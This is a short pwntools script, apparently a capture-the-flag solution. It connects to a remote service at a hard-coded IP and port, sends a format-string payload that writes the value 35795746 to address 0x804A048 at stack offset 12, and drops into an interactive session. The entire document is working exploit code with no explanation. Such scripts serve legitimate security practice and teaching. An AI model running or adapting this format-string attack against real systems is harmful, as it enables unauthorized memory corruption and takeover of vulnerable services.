from pwn import *
context(arch='i386', os='linux', log_level='debug')

# io = process('./pwn')
io = remote('111.200.241.244', 54698)
key = 0x804A048
payload = fmtstr_payload(12, {key: 35795746}, write_size="byte")
io.send(payload)
io.interactive()